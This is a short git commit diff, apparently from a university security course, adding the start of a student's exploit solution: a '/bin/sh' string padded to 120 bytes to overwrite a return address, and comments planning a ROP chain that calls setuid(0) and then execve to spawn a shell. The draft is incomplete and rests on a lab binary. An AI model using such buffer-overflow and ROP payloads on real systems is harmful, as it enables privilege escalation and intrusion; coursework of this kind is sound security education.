529530e3d996311b52a1037999afd3177fda011d
jvelten <jvelten@umich.edu>
2024-04-03 15:35:18 +0000

    Automatic commit by test script for jvelten sammalik

--- sol7.py
+++ sol7.py
@@ -2,5 +2,24 @@
 
 import sys
 
+#put bin/sh into the buffer then overwrite the return address to the start of ur ropgadget chain
+#The ropgadget chains should be a series of gadgets that pop into registers and return
+#And call syscall and return
 
-#rop chain = pop_rax + setuid syscall number + syscall + pop_rax + execve syscall number + pop_rdi + bin_sh + pop_rsi_r15 + dump + syscall
+
+bin_sh = b'/bin/sh\x00'
+
+
+
+payload = bin_sh + b'A'*(120 - len(bin_sh))
+
+
+
+#set rax to 0x69
+#set rdi to 0
+#then syscall
+
+#eventually we set rdi to address of /bin/sh (where does that come from?)
+#then we set rsi to 0
+#then we set rdx to 0
+#then syscall? How do we do syscall
